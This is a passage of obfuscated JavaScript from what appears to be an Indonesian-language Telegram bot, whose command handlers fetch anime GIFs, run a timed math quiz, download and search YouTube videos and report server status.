_0x41f5a5['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x52a4ac['url']},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1ee)](_0x1ce978['SvrRt'],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978['nmOit'](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978['jVNHh']:{const _0xe7c730=await _0x1ce978[_0x240d04(0x18e9)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1412)+'mp'),_0x4d259d=await _0xe7c730[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x4d259d[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':'glomp2\x20'+_0x83219d},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x2bdd)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x2555)]:{if(_0x1ce978[_0x240d04(0x11b)](_0x1ce978[_0x240d04(0x122a)],_0x1ce978[_0x240d04(0x5a1)]))_0x1ce978[_0x240d04(0x2069)](_0x8a2fec,_0x240d04(0x251c));else{const _0x5879fe=await _0x1ce978[_0x240d04(0x4ab)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/sla'+'p'),_0x128565=await _0x5879fe[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+'nimation']({'url':_0x128565['url']},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x2ad2)](_0x1ce978[_0x240d04(0x10cf)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}}break;case _0x1ce978['YZrmr']:{if(_0x1ce978['wVKBg'](_0x1ce978['ainpb'],_0x1ce978[_0x240d04(0x3cf)])){const _0x17beb5=await _0x1ce978[_0x240d04(0x14b0)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x176c)+'l'),_0x23b47e=await _0x17beb5['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x23b47e['url']},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x24ba)](_0x1ce978['PjLUK'],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x13b9)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}else return _0x1ce978[_0x240d04(0x2804)](_0x1442ee,_0x1ce978['iOIVV']);}break;case _0x1ce978['YOoGj']:{if(_0x1ce978[_0x240d04(0x2275)](_0x1ce978[_0x240d04(0x1cd7)],_0x1ce978['FvRlE'])){const _0x55c89f=await _0x1ce978[_0x240d04(0x1134)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x29db)+'py'),_0x4e469c=await _0x55c89f['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x4e469c[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x10a2)](_0x240d04(0x778),_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978[_0x240d04(0x6be)](_0x240d04(0x147c),_0x83219d)}]]}});}else _0xd3bb7a(_0x5ea323,_0x177954[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);}break;case _0x1ce978['bRkMt']:{if(_0x1ce978[_0x240d04(0x2195)](_0x240d04(0x1a1a),_0x1ce978[_0x240d04(0x2c93)])){const _0xc85b93=await fetch('https://ap'+_0x240d04(0x1150)+_0x240d04(0x2cf7)+'k'),_0x201748=await _0xc85b93[_0x240d04(0x1314)]();_0x23c0de['replyWithA'+'nimation']({'url':_0x201748[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x241b)](_0x1ce978[_0x240d04(0x1fb6)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':_0x1ce978[_0x240d04(0x1a46)](_0x240d04(0x147c),_0x83219d)}]]}});}else return _0x1aad81(_0x1ce978[_0x240d04(0x257a)]);}break;case _0x240d04(0x1aaf):{if(_0x1ce978[_0x240d04(0x66b)]('Tphci',_0x1ce978[_0x240d04(0x2643)]))return _0x19eb8e(_0x1ce978[_0x240d04(0x257a)]);else{const _0x47a138=await _0x1ce978[_0x240d04(0x7be)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1a57)+'e'),_0x5d633b=await _0x47a138['json']();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x5d633b[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x1881)](_0x1ce978[_0x240d04(0x216)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978['jEosS'](_0x240d04(0x147c),_0x83219d)}]]}});}}break;case _0x1ce978['qSFjE']:{const _0x53ef1b=await _0x1ce978[_0x240d04(0x7be)](fetch,'https://ap'+_0x240d04(0x1150)+_0x240d04(0x226d)+'ce'),_0x4fc69e=await _0x53ef1b[_0x240d04(0x1314)]();_0x23c0de['replyWithA'+'nimation']({'url':_0x4fc69e[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x2db8)](_0x1ce978[_0x240d04(0x1de9)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978['GNBgD'](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x1ce978['CKUgQ']:{const _0x19161c=await _0x1ce978[_0x240d04(0x1721)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/cri'+'nge'),_0x34bfea=await _0x19161c[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x1566)+_0x240d04(0x13ca)]({'url':_0x34bfea[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978['OCQzk'](_0x1ce978[_0x240d04(0x1323)],_0x83219d)},{'text':'STOP\x20⛔','callback_data':_0x1ce978[_0x240d04(0x2968)](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x1791)]:{const _0xeca53e=await _0x1ce978[_0x240d04(0x2cb3)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x21b3)+_0x240d04(0x21b8)),_0x38e845=await _0xeca53e[_0x240d04(0x1314)]();_0x23c0de['replyWithA'+_0x240d04(0x13ca)]({'url':_0x38e845[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':'LANJUT\x20📤','callback_data':_0x1ce978[_0x240d04(0x981)](_0x1ce978[_0x240d04(0x2b69)],_0x83219d)},{'text':_0x1ce978['heBfu'],'callback_data':_0x1ce978['haJQT'](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x240d04(0x25c6):{if(_0x1ce978[_0x240d04(0x2843)](_0x1ce978[_0x240d04(0x71a)],_0x1ce978[_0x240d04(0x71a)]))_0x3d4607[_0x240d04(0x15e)](_0x1cea71),_0x1ce978['QFLsq'](_0x406d0c,_0x240d04(0x54a)+'salahan\x20sa'+_0x240d04(0x9e7)+'g.');else{const _0x5a1a85=await _0x1ce978[_0x240d04(0x5a2)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x26bb)+_0x240d04(0x1650)),_0x359447=await _0x5a1a85['json']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x359447[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x241b)](_0x1ce978[_0x240d04(0x367)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':'pepek\x20'+_0x83219d}]]}});}}break;case _0x1ce978['FiiGg']:{if(_0x1ce978[_0x240d04(0x66b)](_0x1ce978[_0x240d04(0x15a5)],_0x1ce978[_0x240d04(0x15a5)])){const _0x14416b=await _0x1ce978[_0x240d04(0x4fc)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1fef)+'ap'),_0x2b4d49=await _0x14416b[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2b4d49[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x17b0)]+_0x83219d},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}else _0x1ce978[_0x240d04(0x18cd)](_0xd121da,_0x224890,_0x203130[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2405)]);}break;case _0x1ce978[_0x240d04(0xba8)]:{const _0x1c05b5=await _0x1ce978['BYTLW'](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1461)+'ko'),_0x2dc138=await _0x1c05b5[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2dc138[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x186c)](_0x1ce978['RxglG'],_0x83219d)},{'text':'STOP\x20⛔','callback_data':_0x1ce978['mLmOm'](_0x240d04(0x147c),_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x2932)]:case _0x1ce978[_0x240d04(0x20d9)]:case _0x1ce978[_0x240d04(0xb78)]:case _0x1ce978[_0x240d04(0x1c8e)]:case _0x1ce978['PzyAs']:case _0x1ce978[_0x240d04(0x1bdb)]:case _0x1ce978['OcBgk']:case _0x1ce978[_0x240d04(0x2824)]:case _0x1ce978[_0x240d04(0x135a)]:case _0x1ce978['TFvgi']:case _0x240d04(0x1d10):case _0x1ce978[_0x240d04(0xfd1)]:case _0x1ce978[_0x240d04(0x96c)]:case _0x240d04(0x1e93):case _0x1ce978['tJHsL']:case _0x1ce978[_0x240d04(0x217f)]:case _0x1ce978[_0x240d04(0x1280)]:case _0x1ce978[_0x240d04(0x1651)]:case _0x1ce978['SizHD']:case _0x1ce978[_0x240d04(0x2034)]:case _0x1ce978['NQwPM']:{if(_0x1ce978[_0x240d04(0x2db3)](_0x1ce978[_0x240d04(0x2c5b)],_0x240d04(0x173e))){const _0x38a2da={'dygfi':function(_0x4975dd,_0x3958f0){return _0x4975dd(_0x3958f0);}},_0x52ffc5=_0x167cfc[_0x5c3225];if(!_0x52ffc5||!_0x52ffc5[_0x240d04(0x2eea)]||!_0x52ffc5[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x2b72)](_0x3d4ee6,'⚠️\x20Kamu\x20bel'+'um\x20daftar\x20'+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+'\x20untuk\x20mul'+_0x240d04(0x2d8a));const _0x38d698={'noob':[-0x3,0x3,-0x3,0x3,'+-',0x3a98,0xa],'easy':[-0xa,0xa,-0xa,0xa,_0x1ce978[_0x240d04(0x2a41)],0x4e20,0x28],'medium':[-0x28,0x28,-0x14,0x14,_0x1ce978['SOxnH'],0x9c40,0x96],'hard':[-0x64,0x64,-0x46,0x46,_0x1ce978[_0x240d04(0x2a41)],0xea60,0x15e],'extreme':[-0xf423f,0xf423f,-0xf423f,0xf423f,'*/',0x7530,0x270f],'impossible':[-0x174876e7ff,0x174876e7ff,-0x174876e7ff,0xe8d4a50fff,'*/',0x7530,0x88b8],'impossible2':[-0x38d7ea4c67fff,0x38d7ea4c67fff,-0x3e7,0x3e7,'/',0x7530,0xc350]},_0x4ac9d7={'+':'+','-':'-','*':'×','/':'÷'},_0x57aed0=_0x19416b['trim']()[_0x240d04(0x1c39)](/\s+/);if(!_0x57aed0[0x0])return _0x1ce978[_0x240d04(0x2cb3)](_0x2e5d8d,_0x240d04(0x483)+_0x240d04(0x24f0)+_0x39147e[_0x240d04(0x1adb)](_0x38d698)['join'](_0x1ce978[_0x240d04(0x1cfc)])+'\x0aContoh:\x20'+_0x334075+('math\x20mediu'+'m'));const _0x5b0fb8=_0x57aed0[0x0]['toLowerCas'+'e']();if(!_0x1ce978['xIvGE'](_0x5b0fb8,_0x38d698))return _0x33a69f(_0x240d04(0x8c5)+'\x20valid!\x0aGu'+'nakan\x20sala'+_0x240d04(0x1de)+_0x13af71[_0x240d04(0x1adb)](_0x38d698)[_0x240d04(0x86e)](_0x1ce978['djjmE']));if(_0x659f56[_0x2a3ac0])return _0x4e3215(_0x1ce978['HQNDB']);const _0x4e0325=_0x1ce978[_0x240d04(0xb74)](_0x555d2b,_0x5b0fb8,_0x38d698,_0x4ac9d7);_0x1b9437('🧠\x20*SOAL\x20MA'+_0x240d04(0x396)+_0x5b0fb8['toUpperCas'+'e']()+(')*\x0a\x0aBerapa'+_0x240d04(0x2e26)+'i:\x0a*')+_0x4e0325[_0x240d04(0x437)]+(_0x240d04(0x2103)+':\x20')+_0x1ce978['qTZTI'](_0x4e0325[_0x240d04(0x2331)],0x3e8)+(_0x240d04(0x16f7)+_0x240d04(0x13fb))+_0x4e0325[_0x240d04(0x194b)]+(_0x240d04(0x934)+_0x240d04(0x1025))),_0x186575[_0x3e4096]={..._0x4e0325,'timeout':_0x471b65(()=>{const _0x505e59=_0x240d04;_0x2d66bc[_0x5d53a2]&&(_0x38a2da['dygfi'](_0x336760,_0x505e59(0xb17)+_0x505e59(0x8a7)+'annya\x20adal'+_0x505e59(0x550)+_0x4e0325[_0x505e59(0x17dd)]+'*'),delete _0x484de8[_0x2f53a7]);},_0x4e0325[_0x240d04(0x2331)])};}else{_0x1ce978[_0x240d04(0x1ea6)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x303874=global[_0x240d04(0xd5e)](_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x15c2)](_0x1ce978[_0x240d04(0x203)],_0x3e6565),{},_0x1ce978[_0x240d04(0x2536)]),_0x2b21d2=await _0x1ce978[_0x240d04(0x1b27)](fetch,_0x303874);if(!_0x2b21d2['ok'])throw await _0x2b21d2['text']();_0x23c0de['replyWithV'+_0x240d04(0x1da4)]({'url':_0x303874},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x2523)]:case _0x240d04(0x83f):case _0x240d04(0x1a01):case _0x1ce978['kIJTE']:case _0x1ce978[_0x240d04(0x1864)]:case _0x240d04(0x436):{_0x1ce978[_0x240d04(0x1606)](_0x476bfb,lang['wait']),_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x240d04(0x25fb)+'i.siputzx.'+_0x240d04(0x219a)+_0x240d04(0x7bb)+_0x3e6565},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':'DELETE\x20⛔','callback_data':_0x1ce978['nplBQ'](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0xf88)]:case _0x1ce978['CskGz']:case _0x1ce978[_0x240d04(0x1c14)]:case _0x240d04(0x6e8):case _0x240d04(0x2140):case _0x1ce978[_0x240d04(0x27a3)]:case _0x1ce978[_0x240d04(0x29e4)]:case'kimnanjoon':case _0x1ce978['npMUL']:case _0x1ce978[_0x240d04(0x18f9)]:case _0x1ce978[_0x240d04(0x2062)]:case'kimjondae':case _0x1ce978[_0x240d04(0x1f04)]:case _0x240d04(0x1d2b):case _0x1ce978[_0x240d04(0x863)]:case _0x240d04(0xca3):case _0x1ce978[_0x240d04(0x1e79)]:case _0x1ce978[_0x240d04(0x218f)]:{if(_0x240d04(0x1db8)!==_0x1ce978[_0x240d04(0x2b00)]){_0x476bfb(lang[_0x240d04(0x172a)]);let _0x54f34c=global[_0x240d04(0xd5e)](_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x2665)]+_0x3e6565,{},'apikey'),_0x518504=await _0x1ce978[_0x240d04(0x3a0)](fetch,_0x54f34c);if(!_0x518504['ok'])throw await _0x518504[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x54f34c},{'caption':lang['ok']});}else _0x1ce978['hnAJD'](_0x3aa599,_0x2aa7fa,_0x476bc8[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);}break;case _0x1ce978[_0x240d04(0x1c0a)]:case'yt':case _0x1ce978[_0x240d04(0x99a)]:case _0x1ce978[_0x240d04(0x2bf7)]:case _0x1ce978[_0x240d04(0xa59)]:case _0x1ce978['sPGXy']:case _0x240d04(0x280b):{if(_0x1ce978[_0x240d04(0x4f0)]!==_0x1ce978[_0x240d04(0x4f0)])_0xcd15e2[_0x240d04(0x15e)](_0x4e892d),_0x32f9e8(_0x1ce978[_0x240d04(0x2e63)]);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x136f)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+('\x20link\x20yout'+_0x240d04(0x2b75)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x2a0e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x294c)+_0x240d04(0x117a)+_0x240d04(0x19e2)));if(!_0x1ce978[_0x240d04(0x2cb3)](_0x3de959,_0x483c03[0x0]))return _0x1ce978['yhrEs'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x18bc)](_0x1ec495,_0x3e6565)+(_0x240d04(0x275e)+_0x240d04(0x2b75)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['AyCQG'](_0x1ec495,_0x3e6565)+(_0x240d04(0x294c)+_0x240d04(0x117a)+_0x240d04(0x19e2)));if(!_0x483c03[0x0][_0x240d04(0x55c)](_0x240d04(0x23b7))&&!_0x483c03[0x0][_0x240d04(0x55c)](_0x1ce978['sEQKj']))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x275e)+_0x240d04(0x2b75)+_0x240d04(0x1f7a)+'aan:\x0a`')+(_0x1ec495+_0x3e6565)+('\x20https://y'+'outu.be/kw'+_0x240d04(0x19e2)));_0x1ce978[_0x240d04(0x2590)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x518772=await _0x1ce978['EIRCB'](fetch,_0x240d04(0x210b)+_0x240d04(0x1041)+'rcel.app/d'+'ownload/yt'+_0x240d04(0x1047)+_0x483c03[0x0]);if(!_0x518772['ok'])throw await _0x518772[_0x240d04(0x1d8c)]();var _0x172064=await _0x518772['json']();_0x23c0de['replyWithV'+_0x240d04(0x1da4)]({'url':_0x172064['download']},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x279f)]:case _0x1ce978[_0x240d04(0x2dc7)]:case _0x1ce978[_0x240d04(0x2d38)]:case _0x240d04(0x22e7):{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x713)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1409)](_0x1ec495,_0x3e6565)+(_0x240d04(0x275e)+'ube`\x0a\x0aCont'+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x294c)+'outu.be/kw'+_0x240d04(0x19e2)));if(!_0x1ce978[_0x240d04(0x225a)](_0x3de959,_0x483c03[0x0]))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x459)](_0x1ec495,_0x3e6565)+('\x20link\x20yout'+_0x240d04(0x2b75)+'oh\x20penggun'+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+('\x20https://y'+'outu.be/kw'+_0x240d04(0x19e2)));if(!_0x483c03[0x0][_0x240d04(0x55c)](_0x1ce978[_0x240d04(0x2487)])&&!_0x483c03[0x0]['includes'](_0x1ce978[_0x240d04(0x1a25)]))return _0x1ce978[_0x240d04(0x1e86)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1394)](_0x1ec495,_0x3e6565)+(_0x240d04(0x275e)+'ube`\x0a\x0aCont'+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x2ef3)](_0x1ec495,_0x3e6565)+(_0x240d04(0x294c)+'outu.be/kw'+_0x240d04(0x19e2)));_0x1ce978[_0x240d04(0x17e2)](_0x476bfb,lang['wait']);let _0x35ce50=await fetch(_0x240d04(0x210b)+_0x240d04(0x1041)+_0x240d04(0x7c6)+_0x240d04(0x942)+_0x240d04(0x1287)+_0x483c03[0x0]);var _0x172064=await _0x35ce50['json']();await _0x23c0de[_0x240d04(0x1566)+'udio']({'url':_0x172064[_0x240d04(0x1a18)],'filename':_0x172064[_0x240d04(0x2016)]});}break;case _0x1ce978[_0x240d04(0x1dbe)]:{if(_0x1ce978[_0x240d04(0x68f)](_0x1ce978[_0x240d04(0x1223)],_0x1ce978[_0x240d04(0x29f9)])){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2b77)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x4f9)](_0x1ec495,_0x3e6565)+(_0x240d04(0x908)+'u`\x0a\x0aContoh'+_0x240d04(0x2890)+'n:\x0a`')+_0x1ce978[_0x240d04(0x1394)](_0x1ec495,_0x3e6565)+('\x20bot\x20Whats'+_0x240d04(0x2153)+_0x240d04(0x1459)));let _0x266413=await youtube[_0x240d04(0x2149)]['list']({'part':_0x1ce978[_0x240d04(0x2b42)],'q':_0x33cfb1,'type':_0x1ce978[_0x240d04(0x81d)],'maxResults':0x1,'order':'relevance'});if(!_0x266413['data']['items']||_0x1ce978[_0x240d04(0x20bb)](_0x266413[_0x240d04(0x2bb6)][_0x240d04(0x223b)][_0x240d04(0x2b45)],0x0)){if(_0x1ce978[_0x240d04(0x228f)](_0x1ce978[_0x240d04(0x21fd)],_0x1ce978[_0x240d04(0x2170)])){const _0x3601e6=_0x278570[_0x240d04(0x104e)](),_0x36e21c=_0x9bd69e['uptime'](),_0xa92725=_0x5cd423['floor'](_0x1ce978[_0x240d04(0x192c)](_0x36e21c,0xe10)),_0x391249=_0xfdb93f[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2d6e)](_0x1ce978['rLyzc'](_0x36e21c,0xe10),0x3c)),_0x323332=_0x180b8a[_0x240d04(0xf02)](_0x1ce978['FHfsx'](_0x36e21c,0x3c)),_0x58e529=_0xa92725+_0x240d04(0x2a6c)+_0x391249+_0x240d04(0x2eca)+_0x323332+'\x20detik';_0x2f58cc['cpuUsage'](function(_0x33bdb5){const _0x5bc9a4=_0x240d04,_0x4c7863=_0x1ce978[_0x5bc9a4(0x15c4)](_0x1ce978[_0x5bc9a4(0x2948)](_0x1ce978[_0x5bc9a4(0x331)](_0x69fde8['totalmem'](),_0x45e2b8[_0x5bc9a4(0x2b6b)]()),_0x26b39b[_0x5bc9a4(0x1fa1)]()),0x64),_0x5089d4=_0x1ce978['UhbFs'](_0x1f8cd1['now'](),_0x3601e6),_0x3d33d2='*「\x20STATUS\x20'+_0x5bc9a4(0x29ba)+_0x5bc9a4(0x60f)+'rver:*\x20'+_0x58e529+(_0x5bc9a4(0x1fa5)+'y:*\x20')+_0x5089d4[_0x5bc9a4(0x22f3)](0x2)+(_0x5bc9a4(0x2c0c)+_0x5bc9a4(0x114a))+_0x1ce978[_0x5bc9a4(0x125f)](_0x33bdb5,0x64)[_0x5bc9a4(0x22f3)](0x2)+(_0x5bc9a4(0x23b6)+'sage:*\x20')+_0x4c7863[_0x5bc9a4(0x22f3)](0x2)+'%';_0x1ce978[_0x5bc9a4(0xce)](_0x196328,_0x3d33d2);});}else throw new Error(_0x1ce978[_0x240d04(0x2eb7)]);}let _0x62ec6a=_0x266413[_0x240d04(0x2bb6)][_0x240d04(0x223b)][0x0],_0x477a38=_0x62ec6a['id'][_0x240d04(0x60c)],_0x3fccbd=_0x62ec6a[_0x240d04(0x2aeb)][_0x240d04(0x2016)],_0x5c473f=_0x62ec6a['snippet'][_0x240d04(0x19d5)+'le'],_0xd94028=_0x62ec6a[_0x240d04(0x2aeb)]['publishedA'+'t'],_0x1b3f7f=_0x62ec6a['snippet'][_0x240d04(0x1f2c)][_0x240d04(0x6c5)][_0x240d04(0x96e)],_0x1dec4d='https://ww'+_0x240d04(0x1e48)+_0x240d04(0x115c)+'v='+_0x477a38,_0x2cafac=_0x240d04(0xf6)+_0x240d04(0x3dc)+'🆔\x20ID\x20:\x20'+_0x477a38+(_0x240d04(0x46e)+'\x20')+_0x3fccbd+(_0x240d04(0x125e)+_0x240d04(0x164))+_0x5c473f+(_0x240d04(0x26e3)+'eo\x20:\x20')+_0x1dec4d+(_0x240d04(0x23b9)+'rikut\x20peri'+_0x240d04(0x2a23)+_0x240d04(0x2ec9)+_0x240d04(0x2443))+_0x1ec495+_0x240d04(0xb4c)+_0x1dec4d+'\x0a'+_0x1ec495+'ytmp4\x20'+_0x1dec4d;_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x1b3f7f},{'caption':_0x2cafac,'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1be0)],'callback_data':_0x1ce978[_0x240d04(0x265e)](_0x1ce978['xmlQJ'](_0x240d04(0xb4c),_0x83219d),_0x1dec4d)},{'text':_0x1ce978['nXMfr'],'callback_data':_0x1ce978[_0x240d04(0x457)](_0x1ce978[_0x240d04(0xe38)](_0x1ce978[_0x240d04(0xd81)],_0x83219d),_0x1dec4d)}]]}});}else _0x1ce978[_0x240d04(0x130c)](_0x198518,_0x4cc128,_0x270cae=>_0x5901cf[_0x240d04(0x1e13)](_0x240d04(0x476)+_0x270cae+(_0x240d04(0x2c1a)+_0x240d04(0x8b2))));}break;case _0x1ce978[_0x240d04(0x90f)]:case _0x240d04(0x4c0):{if(_0x1ce978['SpYFk'](_0x1ce978[_0x240d04(0x2d1)],'pHllV'))_0x4ff076[_0x42cc3f][_0x240d04(0xa48)]=0x1;else{if(!_0x483c03[0x0])return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0x174)+_0x1ce978[_0x240d04(0x1c3a)](_0x1ec495,_0x3e6565)+_0x240d04(0x2859));const _0x4dab1c=_0x483c03[_0x240d04(0x86e)]('\x20');try{const _0x15b719=await _0x1ce978[_0x240d04(0x1b27)](yts,_0x4dab1c);if(!_0x15b719[_0x240d04(0x15a9)][_0x240d04(0x2b45)])return _0x476bfb('❌\x20Tidak\x20ad'+'a\x20hasil\x20di'+_0x240d04(0x286a));const _0x5c109f=_0x15b719['videos'][_0x240d04(0x728)](0x0,0xa)[_0x240d04(0x16e6)]((_0x5068a2,_0xc75f9e)=>{const _0x209ac4=_0x240d04;return'*'+_0x1ce978['SWFIJ'](_0xc75f9e,0x1)+'.\x20'+_0x5068a2[_0x209ac4(0x2016)]+_0x209ac4(0xa55)+_0x5068a2[_0x209ac4(0x3bd)]+_0x209ac4(0x2d47)+_0x5068a2[_0x209ac4(0x2ac3)][_0x209ac4(0x8f0)]+_0x209ac4(0x623)+_0x5068a2['views'][_0x209ac4(0x17bf)+_0x209ac4(0x1743)]()+_0x209ac4(0xfd9)+_0x5068a2[_0x209ac4(0x96e)]+'\x0a';})['join'](_0x240d04(0x147a)+'\x20‌\x20꒷\x20‌\x20꒦\x20‌'+'\x20꒷\x20‌\x20꒦\x0a');await 